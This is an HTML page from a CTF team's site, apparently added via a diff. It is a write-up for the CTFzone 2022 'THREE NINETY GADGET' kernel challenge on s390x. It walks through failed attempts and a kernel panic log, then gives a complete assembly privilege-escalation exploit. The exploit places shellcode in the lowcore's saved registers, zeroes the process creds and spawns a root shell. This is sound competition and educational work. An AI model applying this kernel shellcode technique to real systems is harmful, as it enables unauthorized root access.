@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>THREE NINETY GADGET | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="THREE NINETY GADGET" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/CTFzone-2022/pwn/390_gadget.html" />
+<meta property="og:url" content="https://org.anize.rs/CTFzone-2022/pwn/390_gadget.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="THREE NINETY GADGET" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"THREE NINETY GADGET","url":"https://org.anize.rs/CTFzone-2022/pwn/390_gadget.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="three-ninety-gadget">THREE NINETY GADGET</h1>
+
+<p><strong>Authors</strong> <a href="https://twitter.com/_MatteoRizzo">Nspace</a></p>
+
+<p><strong>Tags</strong>: pwn, kernel, mainframe, s390</p>
+
+<p><strong>Points</strong>: 500 (1 solve)</p>
+
+<blockquote>
+  <p>one_gadget? kone_gadget? <a href="https://ctf.bi.zone/files/three_ninety_gadget_824de25c9ea8a326964a4d1cb5c0e98ed2506416e13093334cc07dc69beb23d7.tar.xz">THREE NINETY GADGET!!!</a> nc three_ninety_gadget.ctfz.one 390</p>
+</blockquote>
+
+<h2 id="analysis">Analysis</h2>
+
+<p>This challenge is basically <code class="language-plaintext highlighter-rouge">kone_gadget</code> from SECCON 2021 (writeup <a href="../../SECCON-2021/pwn/kone_gadget">here</a>) ported to s390x.</p>
+
+<p>Like in the original challenge, the author patched the kernel to add a new syscall:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SYSCALL_DEFINE1</span><span class="p">(</span><span class="n">s390_gadget</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="n">pc</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">register</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">r14</span> <span class="n">asm</span><span class="p">(</span><span class="s">"14"</span><span class="p">)</span> <span class="o">=</span> <span class="n">pc</span><span class="p">;</span>
+    <span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"xgr %%r0,%%r0</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r1,%%r1</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r2,%%r2</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r3,%%r3</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r4,%%r4</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r5,%%r5</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r6,%%r6</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r7,%%r7</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r8,%%r8</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r9,%%r9</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r10,%%r10</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r11,%%r11</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r12,%%r12</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r13,%%r13</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"xgr %%r15,%%r15</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">".machine push</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">".machine z13</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v0</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v1</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v2</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v3</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v4</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v5</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v6</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v7</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v8</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v9</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v10</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v11</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v12</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v13</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v14</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v15</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v16</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v17</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v18</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v19</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v20</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v21</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v22</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v23</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v24</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v25</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v26</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v27</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v28</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v29</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v30</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"vzero %%v31</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">".machine pop</span><span class="se">\n</span><span class="s">"</span>
+             <span class="s">"br %0"</span>
+             <span class="o">:</span> <span class="o">:</span> <span class="s">"r"</span> <span class="p">(</span><span class="n">r14</span><span class="p">));</span>
+    <span class="n">unreachable</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The custom syscall zeroes every general-purpose register and then jumps to an
+address chosen by us. Somehow we have to use this to become root.</p>
+
+<p>What makes this challenge difficult is that we have to write a kernel exploit for a fairly obscure architecture that no one on the team had seen before, and which is not supported by most of the tools we normally use (pwndbg, gef, vmlinux-to-elf, etc…).</p>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>The first thing I tried was to replicate the solution we used for the original
+challenge at SECCON. Unfortunately that doesn’t work because the root filesystem
+is no longer in an initramfs but in an ext2 disk. The flag is no longer in memory
+and we would need to read from the disk first.</p>
+
+<p>I also tried to use the intended solution for the original challenge (inject
+shellcode in the kernel by using the eBPF JIT), but…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ /pwn
+seccomp: Function not implemented
+</code></pre></div></div>
+
+<p>it looks like the challenge kernel is compiled without eBPF or seccomp, so we
+can’t use that to inject shellcode either.</p>
+
+<p>I also tried to load some shellcode in userspace, and then jump to it</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[    4.215891] Kernel stack overflow.
+[    4.216147] CPU: 1 PID: 43 Comm: pwn Not tainted 5.18.10 #1
+[    4.216363] Hardware name: QEMU 3906 QEMU (KVM/Linux)
+[    4.216532] Krnl PSW : 0704c00180000000 0000000001000a62 (0x1000a62)
+[    4.216964]            R:0 T:1 IO:1 EX:1 Key:0 M:1 W:0 P:0 AS:3 CC:0 PM:0 RI:0 EA:3
+[    4.217079] Krnl GPRS: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
+[    4.217140]            0000000000000000 0000000000000000 0000000000000000 0000000000000000
+[    4.217196]            0000000000000000 0000000000000000 0000000000000000 0000000000000000
+[    4.217251]            0000000000000000 0000000000000000 0000000001000a60 0000000000000000
+[    4.218310] Krnl Code: 0000000001000a5c: 0000        illegal
+[    4.218310]            0000000001000a5e: 0000        illegal
+[    4.218310]           #0000000001000a60: 0000        illegal
+[    4.218310]           &gt;0000000001000a62: 0000        illegal
+[    4.218310]            0000000001000a64: 0000        illegal
+[    4.218310]            0000000001000a66: 0000        illegal
+[    4.218310]            0000000001000a68: 0000        illegal
+[    4.218310]            0000000001000a6a: 0000        illegal
+[    4.218850] Call Trace:
+[    4.219231]  [&lt;00000000001144de&gt;] show_regs+0x4e/0x80
+[    4.219718]  [&lt;000000000010196a&gt;] kernel_stack_overflow+0x3a/0x50
+[    4.219780]  [&lt;0000000000000200&gt;] 0x200
+[    4.219958] Last Breaking-Event-Address:
+[    4.219996]  [&lt;0000000000000000&gt;] 0x0
+[    4.220445] Kernel panic - not syncing: Corrupt kernel stack, can't continue.
+[    4.220652] CPU: 1 PID: 43 Comm: pwn Not tainted 5.18.10 #1
+[    4.220727] Hardware name: QEMU 3906 QEMU (KVM/Linux)
+[    4.220792] Call Trace:
+[    4.220816]  [&lt;00000000004ce1a2&gt;] dump_stack_lvl+0x62/0x80
+[    4.220879]  [&lt;00000000004c4d16&gt;] panic+0x10e/0x2d8
+[    4.220933]  [&lt;0000000000101980&gt;] s390_next_event+0x0/0x40
+[    4.220986]  [&lt;0000000000000200&gt;] 0x200
+</code></pre></div></div>
+
+<p>Unfortunately that didn’t work either. At this point I started reading more about
+the architecture that the challenge it’s running on. I found <a href="https://www.kernel.org/doc/html/v5.3/s390/debugging390.html">this page</a> from the
+Linux kernel documentation, as well as IBM’s manual useful.</p>
+
+<p>As it turns out, on z/Architecture the kernel and userspace programs run in
+completely different address spaces. Userspace memory is simply not accessible
+from kernel mode without using special instructions and we cannot jump to
+shellcode there.</p>
+
+<p>At this point I was out of ideas and I started looking at the implementation of
+Linux’s system call handler for inspiration. One thing that I found interesting
+is that the system call handler reads information such as the kernel stack
+from a special page located at address zero. The structure of this special zero
+page (lowcore) is described in <a href="https://elixir.bootlin.com/linux/latest/source/arch/s390/include/asm/lowcore.h">this Linux header file</a>.</p>
+
+<p>Interestingly enough on this architecture, or at least on the version emulated by
+QEMU, all memory is executable. Linux’s system call handler even jumps to a
+location in the zero page to return to userspace. If we could place some
+controlled data somewhere, we could just jump to it to get arbitrary code
+execution in the kernel.</p>
+
+<p>At some point I started looking at the contents of the zero page in gdb and I
+realized that there <em>is</em> some memory that we could control there and use as
+shellcode. For example <code class="language-plaintext highlighter-rouge">save_area_sync</code> at offset 0x200 contains the values of
+registers r8-r15 before the system call. The values of those registers are completely
+controlled by us in userspace. What if we placed some shellcode in the registers
+and jumped to it? I used a very similar idea to solve <a href="../../0CTF-2021-finals/pwn/kernote">kernote</a> from the 0CTF 2021 finals
+except this time instead of merely using the saved registers as a ROP chain,
+they’re actually executable and we can use them to store actual shellcode!</p>
+
+<p>We only have 64 bytes of space for the shellcode, which isn’t a lot but should
+be enough for a small snippet that gives us root and returns to userspace.</p>
+
+<p>The zero page even contains a pointer to the current task, and we can use that
+to find a pointer to our process’s creds structure and zero the uid to get root.</p>
+
+<p>Here is the full exploit:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.section .text
+.globl _start
+.type _start, @function
+_start:
+    larl %r5, shellcode
+    lg %r8, 0(%r5)
+    lg %r9, 8(%r5)
+    lg %r10, 16(%r5)
+    lg %r11, 24(%r5)
+    lg %r12, 32(%r5)
+    lg %r13, 40(%r5)
+    lg %r14, 48(%r5)
+    lg %r15, 56(%r5)
+    lghi %r1, 390
+    lghi %r2, 0x200
+    svc 0
+
+userret:
+    # Launch a shell
+    lghi %r1, 11
+    larl %r2, binsh
+    larl %r3, binsh_argv
+    lghi %r4, 0
+    svc 11
+
+binsh:
+    .asciz "/bin/sh"
+
+binsh_argv:
+    .quad binsh
+    .quad 0
+
+.align 16
+shellcode:
+    lg %r12, 0x340
+    lg %r15, 0x348
+
+    # Zero the creds
+    lghi %r0, 0
+    lg %r1, 0x810(%r12)
+    stg %r0, 4(%r1)
+
+    # Return to userspace
+    lctlg %c1, %c1, 0x390
+    stpt 0x2C8
+    lpswe 0x200 + pswe - shellcode
+
+.align 16
+pswe:
+    # Copied from gdb
+    .quad 0x0705200180000000
+    .quad userret
+</code></pre></div></div>
+
+<p>Flag: <code class="language-plaintext highlighter-rouge">CTFZone{pls_only_l0wcor3_m3th0d_n0__nintend3d_kthxbye}</code></p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
